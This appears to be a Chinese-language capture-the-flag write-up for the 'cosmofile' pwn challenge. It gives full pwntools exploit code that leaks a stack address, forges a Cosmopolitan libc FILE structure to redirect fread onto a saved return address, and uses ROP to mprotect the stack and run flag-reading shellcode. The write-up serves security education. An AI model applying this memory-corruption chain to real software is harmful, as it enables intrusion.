# L3akCTF 2025 cosmofile Writeup

## 题目简述

cosmofile 使用 Cosmopolitan Libc 4.0.2 编译为静态 amd64 二进制。程序把短文本写入 `/tmp/cosmofile.txt`，却每次固定输出 4096 字节栈缓冲区，从而泄漏未初始化栈内容。隐藏菜单分支又把 `FILE *` 当成普通目标地址写入 0x70 字节，允许伪造 Cosmopolitan 的 `FILE` 结构。

利用时先泄漏栈地址，再伪造文件流的 `fd`、缓冲区大小和缓冲区指针，把后续标准输入导向栈上的返回地址；最后用 ROP 调用 `mprotect()` 将栈改为可执行，并跳到读 flag 的 shellcode。

## 解题过程

### 识别信息泄漏与隐藏选项

程序读取文件后无条件输出整个局部缓冲区：

```c
char buffer[0x1000];

fread(buffer, sizeof(char), sizeof(buffer), stream);
write(1, buffer, sizeof(buffer));
```

文件实际内容远短于 `0x1000`，`fread()` 之后的大部分 `buffer` 未被初始化。选择菜单项 1 后，输出中因此包含旧栈数据。

题目还包含：

```c
case 'ntr':
    read(0, stream, 0x70);
    break;
```

`'ntr'` 是多字符整型常量。在本题编译结果中，它的值为：

```text
0x6e7472 = 7238770
```

而菜单输入经过 `atoi()`，所以发送十进制 `7238770` 即可进入隐藏分支。更关键的是，`stream` 本身已经是 `FILE *`；`read(0, stream, 0x70)` 覆盖的是文件流对象，而不是文件内容。

### 从固定输出中取得栈地址

官方 exploit 在 “Here is a secret of the universe” 后跳过 `0xa46` 字节，读取一个 8 字节栈指针：

```python
io.sendlineafter(b"> ", b"1")
io.recvuntil(b"Here is a secret of the universe:\n")
io.recvn(0xa46)
stack_leak = u64(io.recvn(8))
```

对仓库所附二进制，相关地址关系为：

```python
fread_unlocked_ret = stack_leak - 0xae8
local_buffer = stack_leak - 0xab0
```

这些偏移来自 Cosmopolitan 4.0.2 生成的具体栈帧；更换编译版本后应重新调试确认。

### 伪造 Cosmopolitan FILE

本题的 `FILE` 不是 glibc `_IO_FILE`。调试符号给出的前 48 字节关键字段为：

```text
0x00  char bufmode
0x01  char freethis
0x02  char freebuf
0x03  char forking
0x04  int  oflags
0x08  int  state
0x0c  int  fd
0x10  int  pid
0x14  int  refs
0x18  uint size
0x1c  uint beg
0x20  uint end
0x24  4-byte padding
0x28  char *buf
```

构造函数如下：

```python
def forge_file(target, extra_size):
    payload = b""
    payload += p8(0x00)            # bufmode
    payload += p8(0x01)            # freethis
    payload += p8(0x01)            # freebuf
    payload += p8(0x00)            # forking
    payload += p32(0x242)          # 可读 oflags
    payload += p32(0xffffffff)     # state
    payload += p32(0)              # fd = stdin
    payload += p32(0)              # pid
    payload += p32(0)              # refs
    payload += p32(0x1000 + extra_size)
    payload += p32(0)              # beg
    payload += p32(0)              # end
    payload += p32(0)              # padding
    payload += p64(target)         # internal buffer
    return payload
```

令 `fd=0`，就把后续文件读取的数据源改成标准输入；令 `beg=end=0`，强制流重新填充；令 `buf` 指向目标栈地址，则可把重填充数据导向该地址。

进入隐藏分支并覆盖流对象：

```python
io.sendlineafter(b"> ", b"7238770")
io.sendafter(
    b"secret...\n",
    forge_file(fread_unlocked_ret, 0x1000),
)
```

在此 Cosmopolitan 版本的 `fread()` 路径中，接下来请求的前 `0x1000` 字节进入调用者的局部 `buffer`，额外数据则进入伪造的内部缓冲区。因此可以先发一页含 shellcode 的数据，再紧跟 ROP 链；后者会落到 `fread_unlocked` 的保存返回地址。

### ROP 修改栈权限并执行 shellcode

NX 开启，但二进制 No PIE 且静态链接，包含固定地址的 `mprotect` 与足够的 gadget。先把相关两页栈内存设为 RWX，再跳到局部缓冲区中预置的 shellcode：

```python
elf = context.binary = ELF("./cosmofile")
rop = ROP(elf)

page = fread_unlocked_ret & ~0xfff
rop.mprotect(page, 0x2000, 7)
rop.raw(local_buffer + 0x800)
```

shellcode 位于第一阶段 4096 字节数据的偏移 `0x800`。程序已经占用了 fd 0、1、2 和原文件流 fd 3，因此新打开的 flag 文件是 fd 4：

```python
shellcode = asm(
    shellcraft.open("flag.txt", 0)
    + shellcraft.sendfile(1, 4, 0, 0x100)
    + shellcraft.close(4)
    + shellcraft.exit(0)
)

first_stage = flat(
    {0x800: shellcode},
    filler=b"\x90",
    length=0x1000,
)

io.sendlineafter(b"> ", b"1")
io.sendafter(
    b"Reading from cosmofile:\n",
    first_stage + rop.chain(),
)
```

运行后输出：

```text
L3AK{JU57_b3c4u43_7H3R3_15_N0_vft4bl3_D035N7_m34n_Y0U_5h0uld_61V3_up}
```

上述官方 exploit 已在仓库所附本地二进制上完整运行并得到同一 flag。

## 方法总结

本题的关键是先确认实际 libc 实现。Cosmopolitan 的 `FILE` 布局和缓冲逻辑与 glibc 不同，不能套用 `_IO_FILE` vtable 劫持模板；但隐藏分支给予了直接覆盖流对象的机会，伪造 `fd` 与内部缓冲区后仍能得到定向写入。

完整链条为“短文件触发未初始化栈泄漏 → 多字符常量进入隐藏分支 → 覆盖 `FILE` 对象 → 借 `fread` 重填充覆盖返回地址 → ROP 调用 `mprotect` → 栈上 shellcode 读 flag”。遇到带调试信息的非主流 libc 二进制时，优先从真实结构定义和实际 I/O 路径出发，比根据字段名称猜测行为更可靠。
